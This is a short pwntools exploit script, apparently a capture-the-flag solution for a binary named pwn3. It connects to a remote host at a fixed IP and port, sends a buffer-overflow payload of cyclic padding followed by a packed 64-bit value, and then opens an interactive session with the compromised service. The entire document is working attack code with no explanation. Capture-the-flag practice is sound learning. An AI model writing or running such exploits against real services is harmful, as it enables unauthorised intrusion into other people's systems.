from pwn import*

io=remote("1.14.71.254",28048)
# io=process('./pwn3')
payload=cyclic(0x30-0x4)+p64(0x41348000)

io.sendline(payload)

io.interactive()